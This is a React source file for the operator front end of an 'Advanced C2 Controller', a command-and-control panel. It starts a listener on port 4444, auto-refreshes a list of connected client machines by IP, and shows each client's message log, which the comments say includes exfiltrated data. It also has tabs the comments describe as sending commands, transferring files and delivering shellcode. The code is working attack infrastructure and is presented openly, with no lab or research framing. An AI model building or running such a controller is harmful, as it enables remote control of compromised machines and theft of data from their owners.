function App() {
    // ================================
    //  React State
    // ================================

    // Listener/server status (e.g., "Listening", "Error", etc.)
    const [status, setStatus] = React.useState('');

    // Array of connected clients returned from backend
    const [clients, setClients] = React.useState([]);

    // IP address of currently selected client from the list
    const [selectedClient, setSelectedClient] = React.useState('');

    // Info object about currently selected client (ID, last seen, etc.)
    const [clientInfo, setClientInfo] = React.useState(null);

    // Array of messages (logs, responses, exfil, etc.) from selected client
    const [clientMessages, setClientMessages] = React.useState([]);

    // Which UI tab is currently visible (commands, file transfer, shellcode, etc.)
    const [activeTab, setActiveTab] = React.useState('commands');


    // =====================================
    //  Backend interaction — Listener start
    // =====================================

    const startListener = async () => {
        try {
            const data = await apiService.startListener();
            setStatus(data.status);
        } catch (error) {
            setStatus('Error: ' + error.message);
        }
    };


    // =====================================
    //  Fetch / refresh client list
    // =====================================

    const refreshClients = async () => {
        try {
            const data = await apiService.getClients();
            setClients(data);

            // Auto-select first client if none selected
            if (data.length > 0 && !selectedClient) {
                handleClientSelect(data[0].IPAddress);
            }
        } catch (error) {
            console.error('Error fetching clients:', error);
        }
    };


    // =====================================
    //  Fetch detailed info for a specific client
    // =====================================

    const getClientInfo = async (clientIP) => {
        try {
            const data = await apiService.getClientInfo(clientIP);
            setClientInfo(data);
        } catch (error) {
            console.error('Error fetching client info:', error);
            setClientInfo(null);
        }
    };


    // =====================================
    //  Fetch message history for a client
    // =====================================

    const fetchClientMessages = async (clientIP) => {
        try {
            const data = await apiService.getClientMessages(clientIP);
            setClientMessages(data.messages || []);
        } catch (error) {
            console.error('Error fetching messages:', error);
            setClientMessages([]);
        }
    };


    // =====================================
    //  When user clicks a client in sidebar
    // =====================================

    const handleClientSelect = (clientIP) => {
        setSelectedClient(clientIP);
        getClientInfo(clientIP);
        fetchClientMessages(clientIP);
    };


    // Manually refresh messages for current client
    const refreshMessages = async () => {
        if (selectedClient) {
            await fetchClientMessages(selectedClient);
        }
    };


    // =====================================
    //  Auto-refresh: client list every 5 sec
    // =====================================

    React.useEffect(() => {
        refreshClients(); // Load immediately on mount

        const clientInterval = setInterval(refreshClients, 5000);
        return () => clearInterval(clientInterval); // Cleanup when component unmounts
    }, []);


    // =====================================
    //  Auto-refresh: messages every 2 sec
    //  Only when a client is selected
    // =====================================

    React.useEffect(() => {
        if (selectedClient) {
            const messageInterval = setInterval(refreshMessages, 2000);
            return () => clearInterval(messageInterval);
        }
    }, [selectedClient]);


    // ================================
    //  UI Rendering
    // ================================

    return (
        <div className="container">
            <h1>🖥️ Advanced C2 Controller</h1>
            
            {/* Listener Controls */}
            <div className="section">
                <button onClick={startListener}>Start C2 Listener on Port 4444</button>
                <button onClick={refreshClients}>Refresh Clients</button>
            </div>
            
            {/* Sidebar list of connected clients */}
            <ClientList 
                clients={clients}
                selectedClient={selectedClient}
                onClientSelect={handleClientSelect}
            />
            
            {/* When a client is selected, show details and messages */}
            {selectedClient && (
                <div className="section">
                    <h3>🎯 Selected Client: {selectedClient}</h3>

                    {/* Basic client metadata */}
                    <ClientInfo clientInfo={clientInfo} />
                    
                    {/* Message log for the client */}
                    <div style={{marginTop: '15px'}}>
                        <h4>📨 Client Messages:</h4>
                        <button onClick={refreshMessages}>Refresh Messages</button>
                        <MessageList messages={clientMessages} />
                    </div>
                </div>
            )}
            
            {/* Tabs for sending commands, file transfer, shellcode, etc. */}
            <TabContainer 
                activeTab={activeTab}
                setActiveTab={setActiveTab}
                selectedClient={selectedClient}
                clients={clients}
                onClientSelect={handleClientSelect}
                setStatus={setStatus}
                refreshMessages={refreshMessages}
            />
            
            {/* Status bar */}
            {status && (
                <div className={`status ${utils.getStatusClass(status)}`}>
                    <strong>Status:</strong> {status}
                </div>
            )}
        </div>
    );
}

// Mount React app to DOM
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App />);
